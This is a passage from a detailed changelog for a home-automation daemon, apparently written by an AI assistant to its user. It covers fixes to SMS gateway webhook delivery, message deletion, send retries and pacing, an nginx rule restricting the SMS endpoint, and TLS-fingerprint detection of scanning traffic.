webhook's own delete worked, and nothing ever caught what it missed.

With the webhook and the tidying both on, the sweep now has a beat of its own,
a minute, whatever the looking is set to:

    the webhook deletes its own message      gone
    the sweep, looking = never               gone
    another tick inside the same minute      left alone, the box not asked

And while I was in there: the "hurry up" flag a webhook sets to jump the
minute was not being cleared properly, so the next sweep - and every sweep
after it - ignored the minute and asked the box every tick. It belongs to the
one call that set it.

4.59.0 — *Also take messages off the modem from here* now deletes **that**
message, not whatever happens to be in the inbox. You are right that it was
not doing what it says.

Five texts arriving together is five webhooks. Deleting the whole inbox on the
first one takes away the four whose webhooks are still on their way - and
those are then never acted on at all, which is worse than not deleting. What
it does now:

    inbox: Status(0) Status(1) Help(2) Status-from-another-number(3)
    webhook for "Status" from that number   ->  takes 0, leaves 1, 2, 3
    the second webhook, same words          ->  takes 1
    a webhook for "Topeni", not on the box  ->  takes nothing

Matched on the number and the words, and where several match, **the oldest**
goes - so four identical *Status* in a row are four messages paired with their
four webhooks in the order they arrived, rather than one webhook wiping all
four.

The check that a delete actually happened, from 4.57.0, still applies on top.

4.58.1 — *Give up sooner on an answer* moved too, next to *Give up on the
modem after* where the other patience lives. Same mistake as the spacing: it
is about sending, and the webhook is about receiving.

What is left on the *Instant delivery* card is only what the webhook actually
needs - the switch, the tidying, the agreed word and the two field names.
Everything on it now is about messages coming in, which is what the card says
it is for.

4.58.0 — a failed send tries again, **but only where it certainly never
arrived**, and that distinction is the whole of it.

    connection refused    3 attempts, on fresh connections
    connection reset      3 attempts
    read timed out        1 - gives up at once
    URLError(timeout)     1

A connection refused or reset means the box never saw the request, so trying
again on a new connection costs nothing but a second. A read timing out means
the box **took** it and went quiet - and for a send, the Checkmk thread and
your own phone both say the message is usually on its way. Trying that one
again is a second text to somebody's phone, which is worse than one that was
never acknowledged.

So: retry the first kind twice, a second apart then two, with a fresh token
each time. Never the second kind, however tempting - the whole reason *no
answer from the gateway* is a warning rather than a failure is that the
message has probably gone.

`test/endpoints.py` fails a send four ways and refuses a release where a
timeout is retried or a refusal is not.

4.57.1 — right on both counts: *At most one message this often* applies to
**everything that goes out** - an answer to a text, an alert, one sent from
the card - whichever way messages arrive, because it sits in the one place
every outgoing message passes through. It had nothing to do with the webhook
and I put it on the webhook's card.

Moved to *Messages in and out*, where the rest of the outgoing settings are,
and the wording says so rather than leaving it to be inferred from where it
sits.

`test/endpoints.py` sends a reply, an alert and one by hand and refuses a
release where the spacing skips any of them.

4.57.0 — the two things I skipped, done.

**The delete is checked, not assumed.** *Also take messages off the modem from
here* asked the box to delete and believed it. A box that accepts a delete and
does not do it is exactly what hands the same message over again - which is
the thing that switch exists to prevent. Now the inbox is read back; anything
still there is tried again on its own; and if it still will not go, that is an
event on the Events tab saying which slots and that the modem may hand them
over again. A modem that deletes properly is not asked twice.

**And I searched, which you asked for and I skipped.** It is a known TRB140
behaviour, not ours. A Checkmk user, same box, same API:

> Read timed out (read timeout=30.0) ... Despite the messages, the SMS
> messages are reaching the recipient.

Word for word our *no answer from the gateway*: the message goes, the box does
not say so inside thirty seconds. Their thread is from December 2025 on
current firmware. Nobody there has a fix either - which is worth knowing,
because it means the patience and the spacing are the right kind of answer
rather than a workaround for something I broke, and that your own finding
about firmware 24.3 is the most promising lead anybody has.

4.56.1 — the twenty seconds is a setting: **How long to wait for the gateway
on an answer**, beside the other SMS patience.

    20   the default, and a fair start
    45   for a box you would rather give more rope
    0    an answer gets the same patience as an alert

It was a number in the source and should not have been - the whole point of it
is that it depends on the gateway, and yours is the only one I have ever seen.

4.56.0 — you asked whether we are simply asking that box too much. **We are.**

    13,665 readings of the gateway's status in one day - six a minute,
    every ten seconds, all day - and each one is two questions

That is a TRB140's small web stack being asked something every five seconds
around the clock, and it has to answer those while its radio is putting a
message on the air. It is the best explanation left for the fifty-five second
stalls, and it fits what you noticed: it is always a send that lands while the
box is busy.

**So the status poll stands aside.** Not while a message is going out, and not
for half a minute after one has gone. Asking the box how it feels can wait;
the message cannot.

**And *At most one message this often* is a setting now**, as you asked - no
limit, one a second, one every 2, 5 or 10 seconds. A long message is several
and counts as several: a status reply listing nine sockets is two, and waits
twice.

**Tidying happens the moment a webhook message arrives**, not at the next
round. If the house is doing the deleting, a minute of the message sitting
there is a minute in which the modem may hand it over again.

On *no answer from the gateway*: it means our HTTP request to the box's send
endpoint got no reply inside the patience - twenty seconds for a reply, longer
for an alert. The message has usually gone; the box just never said so. That
is why `zigmon sms waiting` is empty: nothing is queued, because a reply that
fails is never queued - it has already been sent, as far as anyone can tell.

4.55.2 — two shorter intervals on *Look for incoming messages*:

    never - only when the modem forwards them
    every second - only for a gateway that likes being asked
    every 5 seconds
    every 10 / 15 / 30 seconds, every minute, every five minutes

Both lists, the card's and the daemon's, since they have to agree - the
`inputs` walk refuses a release where a card offers something the daemon will
not take.

The caveat is in the wording rather than in a warning: every second means that
box is asked eighty-six thousand times a day, and it is the box that has been
struggling. Five is the one I would reach for first.

4.55.1 — **nothing is deleted from here unless you ask**, because the modem
already does it.

Reading its log again: `urcd` removes a forwarded message on its own, five
seconds after forwarding it. That is the box's normal cleanup. The fight in
4.55.0 was the forwarder's "Don't save received message" deleting the same
slot first - and this house tidying the inbox from its side would be exactly
the same fight with a different second party. I had put in one thing that
deletes to replace another; the right number is none.

So with the webhook on the house touches the modem's inbox not at all. Left
to itself the box cleans up cleanly. *Also take messages off the modem from
here* is a switch, off, for a gateway that does not.

    webhook on, tidy off   nothing deleted from here
    webhook on, tidy on    taken off once a minute, nothing acted on

If it still stalls after this, the modem's log will say who is deleting - and
that is the thing to send.

4.55.0 — **the modem's own log has the stall in it, and it is a fight over a
slot.** Not the radio, not the API being slow. This:

    14:44:44  sms_utils: Removing SMS '0' from memory     the forwarder deletes it
    14:44:49  urcd:      Removing SMS '0' from memory     the box's own cleanup tries too
    14:44:59  urcd:      Failed to Remove SMS '0'         ten seconds later
    14:45:09  urcd:      Failed to Remove SMS '1'         ten seconds
    14:45:19  urcd:      Failed to Remove SMS '0'         ten seconds
    14:45:29  urcd:      Failed to Remove SMS '1'         ten seconds
    14:45:39  gsmd:      SMS was sent                     our reply, 55 s late

"Don't save received message" on the forwarding makes `sms_utils` delete the
message the moment it is forwarded. The box's own `urcd` then tries to delete
the same slot, fails, and tries again every ten seconds - and **the modem
sends nothing while it does**. Fifty-eight of those in one day's log; every
one of your stalls is a run of five of them. That is where the minute went,
and why it was always the second message inside a few seconds: the first had
just been forwarded, and the fight was on.

So: **turn "Don't save received message" OFF** on the Teltonika, and let the
house do the deleting. With the webhook on, once a minute, whatever is still
on the modem is quietly taken off - everything read, everything deleted,
**nothing acted on**, because the webhook already did. No second copy is ever
acted on because tidying never acts at all.

    webhook ON, one round     taken off the modem: 0, 1   acted on: 0
    a second round inside the minute   nothing asked

4.54.0's five-second gap and twenty-second patience stay - they are right for
that box regardless - but they were treating the symptom. This is the cause.

4.54.1 — **after a stall, the gateway is left alone for half a minute.**

What happened after *no answer from the gateway*: the next reply in the queue
was fired straight into a box that was still wedged, and was answered no
better - each one cost the whole patience again, so four replies came out over
a minute and a half and looked like they had been lost. The gap between sends
did not help there, because it is measured from when the last send *began*,
and a send that stalled for twenty seconds had begun long enough ago.

    first send        stalls; a hold is set
    second send       waits for the hold before going, rather than straight in
    a good send       lifts the hold

Thirty seconds, because that is roughly how long the box takes to finish what
it was doing and start answering again - the afternoon's log has it coming
back inside a minute every time.

4.54.0 — your log, every reply of the afternoon, and how long the box took to
accept each:

    14:29:28  Status   1 s
    14:29:31  Help     1 s
    14:29:36  Temp    56 s   <- the third inside eight seconds
    14:39:16  Temp     1 s
    14:39:20  Status  54 s   <- the fourth inside fifteen
    14:44:44  Status   1 s
    14:44:44  Status  55 s   <- the second, in the same second
    14:46:27  Help     0 s
    14:46:31  Status  63 s   <- the second, four seconds later

**The pattern is the gateway, and it is exact.** A send that lands while the
modem is still putting the previous one on the air is accepted by the box's
API and then not answered for a minute - our patience, to the second. The
message goes out; the acknowledgement does not; and everything queued behind
it waits that minute. That is the orange message and the silence after it.

Two changes, both about that box:

**Five seconds between sends, not one and a half.** Every stall was the second
send inside a few seconds. The radio needs longer than 1.5 s to finish a
message, and the API does not say so - it just stops answering.

**A reply gives up on a silent box in twenty seconds.** It is not going to be
acknowledged after that; waiting the full minute only held the next one. The
message is marked unsure, as before, and it will have gone. Alerts keep the
full patience, because nobody is waiting on the other end of them.

Between the two, a burst of commands now costs five seconds each instead of
one plus a minute for every second one - and if the box does stall anyway,
twenty seconds of it rather than sixty.

4.53.2 — **the answer worker stopped, and nothing started it again.** That is
the "works, then from one message on it does not, for good" you have been
describing, and I put it there yesterday.

It went quiet after half a minute with nothing to do and was started again by
the next answer. A race with a plain losing side: an answer queued in the
moment between the worker deciding to stop and actually stopping is seen by a
worker that is *still alive*, so nobody sends it - and nothing after it goes
either, because nothing ever starts the worker again. The orange message is
that one, still marked as gone out without an answer from the gateway.

It does not stop now. It is a daemon thread and costs nothing while it waits.

    idle past the half minute   still running
    an answer after that        goes out
    five in a row               all five, in order

That last line took two goes to measure: sends are spaced 1.5 s apart on
purpose, so five of them need eight seconds, and my first measurement gave
them four and declared three of them lost. The gap is the gateway's, not mine -
asking that box three things at once is what made the second and third time
out in the first place.

4.53.1 — **the page was fetching three hundred messages several times a
second.** Your tail shows it plainly: `GET /api/sms/log?limit=300` over and
over, between texts, with nothing happening. 1,734 of them in four hours, eight
in the worst second.

That is the SMS tab redrawing on every tick and refetching the whole log each
time, whether or not anything had been added to it. The daemon has said how
many messages there are and when the newest landed since 4.51.1 - so the tab
asks only when one of those moves, when the filter changes, or when something
was deleted:

    eight ticks, log unchanged   1 fetch   (was eight)
    a new message arrives        1
    the filter changes           1
    forced, after a delete       1

The obvious guard - "and there is something on screen already" - is in there
and wrong, and I had to measure it to see why: ten ticks arriving faster than
the answer all see an empty box and all fetch again. The mark alone decides,
and it starts as null so the first drawing always fetches.

This is very likely the lag as well: every one of those was the daemon
serialising a read of the whole log out of the database while everything else
queued behind it.

4.53.0 — **the answer no longer holds up the thing that worked it out.**

The gateway does one thing at a time and takes up to a minute over it. Sent
where the command was understood, that minute was spent either inside the
round of polling - which then read no inbox and acted on nothing - or inside
the webhook request, which left the gateway waiting for us and made it send
the message again. Both ways it looked like the house had stopped, and both
ways it was the same minute.

Answers are queued and sent by one worker, in the order they were made:

    four commands, a gateway taking 2 s each
    read and acted on in     0.0 s      the poll does not wait
    inbox                    emptied
    answers sent             one at a time, in the right order

**One at a time on purpose** - the box cannot do better, and two at once is
what made it time out in the first place. The worker goes quiet after half a
minute with nothing to do and starts again when there is.

**Both ways still work**, which is what you asked me to be careful of: with
the webhook on, the gateway is answered at once and the reply follows on the
worker; with it off, polling reads, acts, empties the inbox and moves on while
the reply goes out behind it. Neither touches the other - they never run
together, by 4.49.0.

Alerts and tests are unchanged: they still go the direct way, because nobody
is waiting on the other end of them.

4.52.1 — **the sent message was written down only once the gateway answered**,
and that box takes up to a minute. So a reply that was already on your phone
was not in the table yet: it looked lost while it was in your hand.

It goes in when it is handed over, as *on its way*, and settles to sent or not
when the gateway says - the same row, amended, not a second one:

    while the gateway is still thinking   out · "Doma jsou: Falco" · (unsure)
    after it answers                      out · "Doma jsou: Falco" · sent
    rows                                  one, not two

This is also why everything felt stuck afterwards. With the webhook off, the
reply is sent from inside the round of polling, so the whole SMS side waits
for that box - up to `sms_timeout_s` times the number of parts, which for a
status listing nine sockets and a sixty-second patience is **three minutes**
of no reading and no acting, per command. The writing-down is fixed here; the
waiting is not, and it is the next thing.

`test/endpoints.py` starts a send against a gateway that takes two seconds and
refuses a release where the message is absent from the table while it goes,
where it ends up written twice, or where it never settles.

4.52.0 — three faults in sending, and **the first one is why the texts
stopped.**

**The hold on the pollers was left on.** While a message is going out, reading
the inbox is held off for up to two minutes: a small gateway does one thing at
a time, and asking it for the inbox while it is handing a two-part message to
the modem is what makes the send time out. That hold was taken off where a
message was queued, and where a *reply* timed out - and nowhere else. So a
reply that failed for any other reason (the gateway refusing a connection,
which your log has twelve of) left it set, and **nothing read the inbox for
the next two minutes**. With the webhook off that is two minutes of no texts
at all. It comes off on every way out of that branch now.

**A long message was given a short patience on the REST road.** The code works
out how long to wait from how many parts the message has - a status reply
listing nine sockets is two - and then the REST call ignored it and used the
plain fifteen seconds. Two-part replies were timing out while the modem was
still working through them. Both the call and its one retry get the worked-out
patience now.

**And a message that was never queued said it had been.** "kept to try again"
was returned whether or not anything was kept, so a reply that failed outright
- which is never queued, deliberately - reported itself as waiting for another
go. It says what actually happened.

`test/endpoints.py` fails a send four ways - reply and alert, timing out and
refused - and refuses a release where any of them leaves the inbox unread.

4.51.1 — the reply reached your phone at once and took a minute to appear on
the screen, and the reason is a small one.

The page redraws the SMS tab when the `sms` block of the status changes -
and **nothing in that block moved when a message arrived**. It holds whether
the gateway is ready, how many went out today, who may command it, how many
commands there are. A text coming in touches none of them. So the tab sat
still until something else happened to change - the next outgoing message
bumping `sent_today`, usually, which is exactly the minute you were watching.

Two fields now: how many messages are in the log and when the newest one
landed. Both come out of what is already held, and either moving is enough for
the page to notice on its next tick, which is about a second.

    before a message   log_n 0   log_at 0
    after              log_n 1   log_at 1789733050

`test/endpoints.py` writes a message down and refuses a release where the sms
block comes out unchanged, or where anything it used to carry has gone missing
on the way.

4.51.0 — **Never kept out is a list now, one address to a line.**

Past the third entry a one-line box is a letterbox, and a house has a phone, a
laptop, a work subnet and a friend's address in there before long. So it is a
box that grows with what is in it - four lines to sixteen, then it scrolls -
monospaced, because that is what makes a typo in a /24 visible:

    192.168.40.0/24
    2a01:430::/48
    89.24.9.9
    10.0.0.0/8
    4 addresses or ranges

The count sits under the box, where the eye already is. *Trusted proxies* gets
the same treatment, for the same reason.

**Nothing changed underneath**: it is still kept as one comma-separated string,
which is what the daemon has always taken, and the lines are only how it is
read and written. Somebody typing untidily - a blank line, a trailing comma,
spaces round an address - is a person typing, not a mistake worth refusing, so
those are dropped on the way out. `192.168.40.0/24 · (blank) · "  10.0.0.5  " ·
"2a01:430::/48,"` saves as `192.168.40.0/24, 10.0.0.5, 2a01:430::/48`.

**On the testing**: the editor itself is checked - three addresses in, three
lines out, an untidy list cleaned, the count right. The whole-page walk is
currently failing in my scratch environment on unrelated checks about the SMS
gateway card, and it fails there with my change removed as well, so it is not
this - but I could not get it back to green to prove the change against a
clean run, and would rather say so.

4.50.1 — a pass over the whole SMS path, and two things from it.

**One real bug, and I made it yesterday.** 4.49.1 stopped using the memory to
skip a message where the gateway gives no date, on the grounds that deleting
is what stops a message coming back. True - unless it cannot be deleted
either. A message with no slot *and* no date would have been acted on again on
every round, for ever: five rounds, five times the command. It is skipped by
the memory now where there is no slot to delete it by, however thin the key,
because then remembering is all there is.

    no slot, no date, five rounds     acted on once
    four real messages, same slot     acted on four times

**And the two "was already here" notes said no road.** A message found sitting
in the inbox at startup, or one seen again before a failed delete, went into
the log with no mark at all while every other message had one. Both come off
the modem and both say so now.

The rest of the pass was clean: every shape a real gateway produces - no date,
no sender, empty text, three thousand characters, an emoji, a number written
with spaces - goes through without a fault.

4.50.0 — a quiet mark on every message in, saying which road it came by.

    ⚡  pushed here by the modem the moment it arrived
    ⬇︎  read out of the inbox on the beat

Beside the clock, small and half-faded until you hover it. It matters when
somebody is asking why a message was slow and not at all the rest of the time,
which is what decides how loud it should be. Outgoing messages have no mark -
there is only one road out.

The road is kept with the message when it is written down, so it survives in
the log rather than being guessed from the settings as they are now: turn the
webhook on this afternoon and yesterday's messages still say they came off the
modem, which is the point of recording it.

**Honestly about the testing**: the daemon side is checked - `road` is carried
from both ways in and kept on the row. The mark itself I have not seen render:
the SMS log draws from a live `api()` call and my harness could not stand a
reply in front of it, and I would rather say so than let a claim rest on "it
parses". Tell me how it looks and I will fix it if it is wrong.

4.49.2 — the week's abandoned attempts taken out, and the whole of the SMS
path walked end to end.

**106 lines of dead code.** Four goes at telling a pushed message from its
copy on the modem, each replaced by the next and none of them removed:
`_sms_pushed`, `_sms_was_pushed`, `_sms_pushed_key`, `_sms_push_seen`,
`sms_settle_later`, `sms_pushed_settle`, `_sms_settling`. Not one of them was
reached by anything any more - they sat there looking like working code,
which is the kind of thing somebody reads in six months and believes. Gone,
and the tests that checked them with them.

What is left, walked through:

    webhook OFF   Status, Status, Temp, Status
                  -> acted 1, 1, 1, 1 - and the inbox empty after each
    webhook ON    a round of polling touches nothing, inbox left alone

Both of the shapes that bit you this week are in that first line: the same
words twice in a row, and a different command between them.

**And your firmware finding goes in the record**, because it will be forgotten
otherwise and it cost an afternoon: `TRB1_R_00.07.24.3` works;
`TRB1_R_00.07.24.5` answers its own API in tens of seconds and does not admit
to sending a message it has sent. I suggested that update because the box
offered it, which was a guess dressed as advice. **Do not update that firmware
because it asks.** It is the road messages take when the internet is down.

4.49.1 — found it, and it is not the duplicate guard: **it is the key, and it
has been wrong since long before any of this week.**

What tells one message from another is the slot, the date, the number and the
words. A modem **hands the slot back** when a message is deleted - the comment
on that function has said so for months - and your gateway gives no date. So
the second `Status` from your phone lands in the slot the first one left and
has *exactly* the first one's key: `1||+420603364754|Status`. It was taken for
a message already dealt with, deleted without being acted on, and gone.

One reply, then nothing, however many you send. Which is what you have been
seeing, and it had nothing to do with the webhook.

Where there is no date there is nothing to tell two such messages apart, so it
no longer tries: **deleting is what stops a message coming back**, and if a
delete has failed, acting twice is the better way round to be wrong than never
acting again. A gateway that does give a date is unaffected - the same message
offered three times is still acted on once.

    no date, four messages, every delete failing    4 acted on
    with a date, one message offered three times    1 acted on

`test/endpoints.py` holds both halves, because the fix is only right if it
keeps the second one true.

4.49.0 — your design, and it is the one that should have been there from the
start. **Two ways in, and only ever one of them.**

    switched OFF   the inbox is read on the beat and emptied here,
                   exactly as it was before any of this was touched
    switched ON    nothing here touches the inbox at all - messages arrive
                   by the webhook, and the modem deletes them itself

Everything that went wrong over the last four versions came from running both
at once and then trying to tell the two copies apart: a key that could not
match, a window of time, a count inside the window, an inbox read that took
forty-five seconds and upset the gateway while it ran. None of that exists
now, because there is no second copy. Nothing to tell apart, nothing to skip,
nothing to duplicate.

    webhook off, one round   the gateway is asked
    webhook on,  one round   the gateway is asked nothing at all
    webhook on,  by hand     `zigmon --sms inbox` still works

On the Teltonika, with the webhook on: **SMS Forwarding → Don't save received
message → on**, so its inbox empties itself and cannot fill up. The card says
so under the switch.

`test/endpoints.py` runs a round of polling in both states and refuses a
release where the gateway is touched with the webhook on, or left untouched
with it off.

4.48.3 — I was wrong twice and am going back. **The push asks the gateway for
nothing.**

Your four messages: one forwarded and answered at once, then forty-five
seconds of nothing, then one more picked up by polling - and two never
accounted for anywhere. The modem's own status at the end says
`in_the_inbox=1`. They did not queue; they went.

What ties those together is the inbox read I added in 4.48.1 to be exact about
which message a push was. On that box it takes **forty-five seconds**, and
while the gateway is busy answering it, its own forwarding misbehaves. Being
exact about which message cost more than the exactness was worth.

So the push now remembers the number and the words and stops - the thing you
disliked, and you were right about its weakness and I was wrong about the
cure. It is counted rather than marked, so four of the same words in a row are
four messages the following poll skips, and a fifth copy nobody pushed is
acted on. Two minutes, because a poll follows a push within seconds wherever
anything is working at all.

    four pushed, six copies offered -> 4 skipped, 2 acted on
    the gateway asked by the push side: 0 times

**The forty-five seconds is still there and is the real problem.** It is that
box answering one question, and nothing here can fix it - but nothing here
should depend on it either, and now nothing does.

4.48.2 — the slow delivery and the duplicates were **one fault, and it was
mine**. Your log:

    11:53:16  SMS push ... acted on
    11:54:01  a pushed message has no copy on the modem

**Forty-five seconds** between those two lines. Dealing with the modem's copy
means asking the gateway for its inbox over HTTP, and I put that inside the
request - so the gateway sat there waiting for us to answer, gave up, and sent
the message again. Every retry was acted on. Three `SMS in` lines within
35 milliseconds at 11:54:13 is that happening.

So: the gateway is answered the moment the message is acted on, and the
settling goes on a thread of its own. One at a time, because two pushes
arriving together would otherwise ask a box that takes forty-five seconds to
answer one question to answer two.

    three pushes handed off in 0 ms
    the gateway asked three times, one at a time

I should have seen this when I wrote it: everything else that talks to that
box - sending, the credit check, the status poll - has been off the request
thread for months, for exactly this reason.

`test/endpoints.py` hands three pushes to a gateway that takes a second and a
half to answer and refuses a release where handing them off takes longer than
half a second, or where the box is asked more than once at a time.

4.48.1 — you were right to dislike it. **A window of time was the wrong
answer**, and the modem already knows a better one.

Every message in its inbox has a slot and a date, and that pair is what tells
one from another - polling has used it since the beginning. A pushed message
carries neither, because the gateway's forwarding form has no field for them,
so yesterday I matched on the number and the words within ten minutes. That
works until somebody sends the same word twice inside the window, and it
depends on a clock for something that should not depend on anything.

Now, the moment a pushed message has been acted on, the daemon asks the modem
for its inbox, finds that copy by its number and words, and from then on uses
**the modem's own key** for it:

    the modem's own key   3|26/09/18,11:29:16|+420603364754|Status
    taken off the modem   slot 3
    written down          as dealt with, under that key

After which there is nothing to duplicate - polling looks at the inbox and the
message is not in it, and if a delete failed it is skipped by the same key
polling would have made itself. Nothing hangs on how far apart the two are.

Settled **after** acting, not before: if the modem cannot be reached at that
moment the message has still been acted on, and polling will act once more -
which is the safer way round to be wrong than never acting at all.

A push whose copy is not on the modem - a gateway that forwards without
storing - finds nothing and says so in the debug log, which is not a fault.

4.48.0 — you asked exactly the right question, and the answer was no: **a
pushed message would have been acted on twice.**

Polling knows what it has already dealt with by a key made of the slot, the
date, the number and the words. A pushed message has no slot and no date, so
its key could never match the one polling makes a few seconds later off the
same message still sitting in the modem's inbox - and the command would run
again. Turn a light off, and off again; run a script, and run it again.

The push now remembers the number and the words, and a poll that finds the
same pair within **ten minutes** writes it down, takes it off the modem, and
does not act:

    after the push                     acted on
    the poll sees the same words       not acted again
    a different message                acted on
    the same words from another phone   acted on
    the same words eleven minutes later acted on

Ten minutes because a poll can be slow or a gateway can hold a message, and
because somebody sending *Status* twice on purpose an hour apart means it
twice.

**And it is still taken off the modem**, which is the other half of what you
asked. The copy on the device is what would bring it back on the next round,
and a full inbox stops new messages arriving altogether - so a pushed message
is deleted exactly as a polled one is, it is only the *acting* that is
skipped. Polling stays on, as you say: a late message beats no message.

4.47.5 — you are right that the account was not of the modem. What the daemon
sees is the **relay's** request, not the box's - so those headers in your log
were our own Host, our own Content-Type and our own token, and the modem's own
were lost at the web server.

The relay carries them across now, and both halves are written down:

    SMS push, as the modem sent it to the web server:
       from    192.168.47.254
       POST /index.php?api=sms-incoming
       header  user-agent: Teltonika TRB140
       header  x-device-serial: 1234567
       header  content-type: application/json
       body    {"password": "<the word, 6 char(s)>", "number": "+420603364754", ...}
    ...and as it reached the daemon:
       [what it looks like after the relay]

Every header the box sent, its address, its method, its URI and the raw body
exactly as it arrived - which is the thing you need when the field names do
not match, because it shows what they really are rather than what we made of
them.

**The word is blotted wherever it appears**, including inside the raw body,
where it sits under whatever name the modem chose. Tried: it is replaced by
its length everywhere, not just in fields called `secret`.

`test/endpoints.py` pushes a message carrying a modem's headers and refuses a
release where they are missing, or where the word survives in the raw body.

4.47.4 — the body arrives now, and the log shows the last thing in the way:

    body    number = +420603364754
    body    password = 48 char(s) ending 1eb2
    body    text = U3RhdHVz
    this house expects: the word in "secret" or "key"

The number is right, the text is right, the word is right - and it is under
**`password`**, because that is what the gateway's own form calls that field
and what I told you to type. The daemon took `secret` and `key` and nothing
else, so a correctly-configured modem was refused for a wrong word, which sent
you looking at the word rather than at its name.

Any of `secret`, `key`, `password`, `pass` or `token` is taken now - use
whichever the modem's form offers. The card says so, and the debug line lists
all five rather than two.

`test/endpoints.py` pushes the same message under each of the five names and
refuses a release where any is turned away, or where a wrong word under
`password` is let through.

4.47.3 — the debug account paid for itself on its first outing. Your log:

    SMS push from 127.0.0.1:
       GET /api/sms/incoming?api=sms-incoming&
       query   api = sms-incoming
    warn  an SMS push arrived with the wrong word

**A GET, with an empty request.** The modem sent a POST with the message in
its body - nginx's log shows it - and the relay forwarded the query string and
nothing else, as a GET. So the daemon was handed a request with no word, no
number and no text, and refused it for having the wrong word, which is the
least useful of the three things it could have said.

The relay now passes on what the modem actually sent: the body parsed as JSON
or as a form, the method it came with, and the query where one was used. Both
shapes tried, both answered 200 where they were answered 403 before.

`test/render.js` pushes a message as JSON and as a form and refuses a release
where either fails to reach the daemon at all.

Worth saying about that log: polling caught the message anyway, 2.5 seconds
later - *SMS in +420603364754 - Status*. The two roads doing the same job is
why nothing was lost while the faster one was broken.

4.47.2 — **the SMS gateway gets a road of its own**, so it need not be allowed
at the dashboard as a whole.

Your five 403s were nginx's own, not the daemon's - 146 bytes is its refusal
page, and none of the three the daemon can give is that length. The request
never reached PHP, which is why nothing appeared in the log even with debug
on. The gateway is 192.168.47.254 and the allow list at the top of the server
has your own subnets and nothing else.

Adding it there would have let a box on another network with a SIM card in it
reach every view the house has. So it gets what `/tap` already had:

    location = /api/sms/incoming {
        allow 192.168.47.254;         # the gateway, that one address
        allow 192.168.40.0/24;        # so a browser can test it by hand
        allow 127.0.0.1;
        deny  all;
        ...POST only, 8k of body, and the rate limit
    }

Rules in a location replace the ones above them, so the dashboard stays
exactly as shut as it was. POST only, a body of eight kilobytes, and the rate
limit, because anybody who reaches this road is trying the agreed word.

`test/nginx.py` refuses a release where that road is missing, where it does
not shut itself to everybody else, where it has no rate limit or body limit,
or where it names a zone that is never declared.

4.47.1 — **with debug on, the whole of what the modem sent.** Setting this up
means guessing what a box on the far side of a SIM card calls its fields, and
the only way to stop guessing is to see the request it actually made:

    SMS push from 192.168.47.254:
       POST /api/sms/incoming
       header  User-Agent: Teltonika TRB140
       header  Content-Type: application/json
       body    from = +420777123456
       body    password = 14 char(s) ending rise
       body    text = c3ZldGxhIG9mZg==
       this house expects: the word in "secret" or "key", the number in
         "number", the text in "text", base64-encoded
       nothing under "number" - the number is somewhere else in the request above
       taken as: from (nobody), 10 character(s): svetla off
       it matched a command: no, written down only

Every header, every field of the body, every query parameter - and then what
this house was looking for, which field it could not find, what it made of
the rest, and whether that matched a command. The example above is a real
mismatch: the modem called it `from` and the setting says `number`, and the
log says so in as many words rather than leaving a silent failure.

**The agreed word is never written in full** - it appears as its length and
last four characters, wherever it turns up and whatever it is called. A
pushed message is somebody's text and the word travels inside it, so debug
being on must not put it in a file.

`test/endpoints.py` pushes a message with debug on and refuses a release where
any part of that account is missing, or where the word appears whole.

4.47.0 — **instant delivery has a switch**, because "empty = no push" is not
one.

An empty word was the only way to shut that road, and it said nothing.
Somebody setting up the far end got the same silent refusal whether the road
was off, on with no word set, or on with the wrong word - three quite
different problems, one answer. Now:

    switched off       403  pushed messages are switched off here
                            (Control → SMS gateway → Instant delivery)
    on, no word set    403  instant delivery is on but no word is set for it
    on, wrong word     403  that is not the word we agreed on
    on, right word     200

The box on the far side of a SIM card cannot carry this house's token, so the
agreed word is what makes a message ours - but whether the road is open at all
is now its own decision, said in its own switch, and a refusal names which of
the three it is.

`test/endpoints.py` pushes a message in all four states and refuses a release
where any of them answers as another.

4.46.2 — the Back and Next inside the folds had no icons, because they asked
for ones that do not exist. They wanted `left` and `right`; the icons are
called `prev` and `next`.

**A button asking for a name that is not there gets an empty `<svg>` and no
complaint** - nothing throws, nothing is logged, the button simply comes out
bare. Which is why it survived two releases and a walk of the whole page:
every check I had asked whether a button *has* an icon element, and it does.

`test/render.js` now reads the names out of the icon table and every name any
button asks for, and refuses a release where one asks for a name that is not
in the other. That catches the shape rather than these two.

4.46.1 — the rule numbers are on the rows and the words beside them are not,
and there are two reasons, one of which is a real gap.

**The gap**: a sweep fetched the rules for lines it had just read, and nothing
else. Every address already on your list - blocked over the last two days,
before any of this existed - had its rule number in the database and its rule
nowhere. The row could say *rule 2400015.4832* and not a word about what that
rule is. A sweep now also picks up the rules for every address already on the
list, once, in the same grep. After one minute of running, your rows will
carry their words.

**And the other reason is on purpose.** Almost everything on your list right
now is ET DROP, CINS or Dshield - reputation rules, which fire because the
address is on a list. Those carry one reference and it points at the feed
file, which 4.44.5 stopped showing because it says nothing about the address
that fired. So for those rows there is no link and there will not be one: what
you get is the rule's own sentence and what it matches on. A link appears
where the rule is about a *thing* rather than a list - a CVE, a write-up - and
the log you sent has one such rule in it (`ET SCAN Zmap User-Agent`), against
forty that are reputation.

`test/taps.py` blocks three addresses the old way, runs a sweep, and refuses a
release where their rules do not come down with it.

4.46.0 — the fingerprints are landing, and your own log immediately showed a
shape I had not thought of.

**85.217.149.10, 09:27:24.** Twenty connections inside one second, wearing
**fifteen different fingerprints** - TLS 1.1, 1.2 and 1.3, cipher list after
cipher list, some with an SNI and some without. 185.12.59.117 did the same at
09:16. No client behaves like that: a browser has one hello and uses it, a
phone app connects a thousand times wearing the same one. That is a tool
measuring what the server will accept.

I had built the opposite rule - one fingerprint across many addresses - and
this one is stronger, because it shows in **a minute** where an address's
behaviour on the road would take an hour:

    one address, fifteen fingerprints    weighs 6, seen at once
    one address, one fingerprint, 40x    nothing
    one address, three over a minute     nothing

Six is the bar and it is a setting. A browser picking up two or three over a
minute is nothing at all.

**And the fingerprinting is working**: your first three `tls` lines have nulls
because they are from 09:04, before the restart that picked the setting up.
Everything from 09:16 carries ja3, ja3s and ja4 - including your own phones,
which all share `t13d2013h2_a09f3c656075_7f0f34a4126d`, and which the house
leaves alone because they are under *never kept out*.

4.45.0 — you are right, and it is better than what I did. **The rules come
down with the logs and are read from the database afterwards.**

4.44.6 fixed the slowness by not reading the rules on a list at all, which
made the page fast and the list poorer: the rows could name a number and
nothing else. Fetching them with the logs gets both.

A new table, `ids_rules`. When a sweep reads the eve log, it takes the rule
numbers that fired, asks the proxy **once** for all the ones it does not
already have, and keeps them. A rule does not change between fetches, so
nothing ever asks twice:

    100 rules fetched              1 trip over SSH
    asked again                    0 trips
    blocked_list(), 100 rows       5 ms, 0 trips, and every row says
                                   what its rule looks for
